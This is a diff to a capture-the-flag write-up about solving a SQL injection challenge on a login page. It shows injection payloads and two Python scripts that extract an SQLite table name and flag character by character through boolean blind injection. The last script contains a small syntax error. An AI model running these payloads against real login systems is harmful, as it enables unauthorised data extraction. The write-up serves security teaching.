@@ -12,7 +12,7 @@ Points : 200
  
 once i opened the challenge i found this page 
 
-[loginpage](login-page-photo)
+[loginpage](./assets/ieee/login-page)
 
 And we have a hint on the description that tell us we don't need to fuzzing so our entry is the login page 
 so i tried ```admin``` ```admin``` in the user and pass , i have got response ```wrong password``` so now i know that we have admin username . 
@@ -46,9 +46,9 @@ then i typed ```aboelnour" or 1=1 -- -``` and B00M i have got response ```Wrong 
 
 so let's enum our sql type 
 
-i tried ```aboelnour" select version()-- -``` but i got internal server error 
+i tried ```admin" select version()-- -``` but i got internal server error 
 
-so i tried ```aboelnour" select sqlite_version()-- -``` , and response was Wrong password , so our db is ```SQLite``` 
+so i tried ```admin"select sqlite_version()-- -``` , and response was Wrong password , so our db is ```SQLite``` 
 
 -----
 
@@ -105,7 +105,81 @@ but it will be hard to make it manually so i have wrote python script to got tab
 
 ## Exploit code 
 
+first we need to convert our username to hex and concate it with 000061 , 61 is the password
+second we need to brute force chars in i place then check if Wrong in response so we got the right char and increase step with 1 to find the second char and so on 
 
 
+```python
+import requests
+import string
+
+url = 'http://challenge.com/login'
+myobj = '%s000061'
+returned_text="Wrong"
+table=""
+step = 1
+for j in range(1,len(string.printable)):
+	for i in string.printable:
+		payload = f'admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\' and tbl_name like \'%fl%\'),{step},1) = \'{i}\' -- -'
+		p = payload.encode('utf-8').hex()
+		p = myobj % p 
+		x = requests.post(url, data=p)
+		if returned_text in x.text :
+			step += 1
+			print(x.text)
+			print(i)
+			table = table + i
+			print("found more char : ", table)
+
+print("Flag table name : " , table)
+```
+
+Afer running this script i got 
+```
+Flag table name : Flag_jnk249
+```
+
+so now we have the table name 
+
+before brute force column i have try this payload 
+
+```
+admin"select flag from Flag_jnk249-- -
+```
+and i got Wrong password so our column name is flag 
+
+i modified my previse script to got the flag 
 
 
+```
+import requests
+import string
+
+url = 'http://challenge.com/login'
+myobj = '%s000061'
+flag=""
+returned_text="Wrong"
+step = 1
+for j in range(1,len(string.printable)):
+	for i in string.printable:
+		payload = f'admin"and SUBSTRING((SELECT flag from Flag_jnk249),{step},1) = \'{i}\' -- -'
+		p = payload.encode('utf-8').hex()
+		p = myobj % p 
+		x = requests.post(url, data=p)
+		if returned_text in x.text :
+			step += 1
+			print(x.text)
+			print(i)
+			flag = flag + i
+			print("found more char : ", flag)
+
+print("FLAG : " flag)
+```
+
+```
+AND finnaly i have got FLAG : EGCERT{flaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag}
+```
+
+
+#### Linked in : https://www.linkedin.com/in/maboelnour12/
+#### Facebook : https://www.facebook.com/maboelnour12
